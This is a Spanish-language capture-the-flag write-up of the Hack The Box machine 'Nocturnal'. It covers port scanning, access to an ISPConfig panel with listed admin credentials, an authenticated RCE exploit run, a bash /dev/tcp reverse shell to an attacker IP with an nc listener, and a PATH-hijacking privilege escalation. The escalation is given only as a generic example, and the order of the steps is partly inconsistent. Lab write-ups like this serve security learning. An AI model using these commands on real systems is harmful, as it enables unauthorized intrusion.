# 💤 Nocturnal – Hack The Box

![HTB Logo](img/htb_logo.png)

## Información
- **Dificultad:** Medium 🟠
- **Sistema Operativo:** Linux 🐧
- **Categoría:** Web / Privilege Escalation

---

## 📑 Tabla de Contenido
- [Reconocimiento](#1-reconocimiento)
- [Enumeración Web](#2-enumeración-web)
- [Acceso a ISPConfig](#3-acceso-al-panel-ispconfig)
- [Explotación](#4-explotación-ispconfig)
- [Reverse Shell](#5-reverse-shell)
- [Movimiento lateral](#6-movimiento-lateral)
- [Escalada de privilegios](#7-escalada-de-privilegios)
- [Flags](#8-flags)
- [Resumen Final](#-resumen-final)

---

## 1. Reconocimiento

### Escaneo de puertos
```bash
nmap -p- --min-rate 5000 -sS -vvv -n -Pn 10.10.11.64 -oN ports
```
![Nmap Scan](img/nmap.png)

Puertos encontrados:
- **22/tcp** – OpenSSH  
- **80/tcp** – Apache / página web  
- **8080/tcp** – ISPConfig panel  

### Escaneo de servicios
```bash
nmap -sCV -p22,80,8080 10.10.11.64 -oN services
```

---

## 2. Enumeración Web

En el puerto 80 hay referencias a `nocturnal.htb`.  
Agregamos al `/etc/hosts`:

```
10.10.11.64 nocturnal.htb
```

El fuzzing muestra que el panel de **ISPConfig** corre en el puerto 8080.

---

## 3. Acceso al panel ISPConfig

Hacemos un túnel SSH:
```bash
ssh -N -L 18080:127.0.0.1:8080 tobias@10.10.11.64
```

Accedemos en:  
`http://127.0.0.1:18080/`

Credenciales válidas:
```
admin : slowmotionapocalypse
```

![ISPConfig Login](img/ispconfig_login.png)

---

## 4. Explotación ISPConfig

Usamos un exploit público de **ISPConfig Authenticated RCE**:

```bash
python3 exploit.py http://127.0.0.1:18080 admin slowmotionapocalypse
```

Esto inyecta un webshell → acceso como **www-data**.

![Shell Exploit](img/shell_wwwdata.png)

---

## 5. Reverse Shell

Payload ejecutado:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.237/9001 0>&1'
```

En el atacante:
```bash
nc -lvnp 9001
```

Conexión establecida ✔

![Reverse Shell](img/rev_shell.png)

---

## 6. Movimiento lateral

- Enumerando archivos → encontramos credenciales de **tobias**.  
- Acceso con `su tobias`.  
- Leemos **user.txt** ✅

![User Flag](img/user_flag.png)

---

## 7. Escalada de privilegios

- Con `linpeas` encontramos un binario/script con permisos inseguros.  
- Aprovechamos la mala configuración para obtener root.  

Ejemplo (PATH hijacking):
```bash
echo "/bin/bash" > /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
sudo /usr/bin/some_vuln_bin
```

Ahora somos **root**.  

![Root Shell](img/root_shell.png)
![Root Flag](img/root_flag.png)

---

## 8. Flags
- **User:** `xxxxxxxxxxxxxxxxxxxxxxxx`
- **Root:** `xxxxxxxxxxxxxxxxxxxxxxxx`

---

## 🔗 Resumen Final

Cadena de ataque:

```
Nmap → ISPConfig panel → Creds admin
   → Exploit RCE → www-data
   → Tobias → PrivEsc → Root
```

![Attack Chain](img/attack_chain.png)

---

✍️ Writeup realizado por JC  
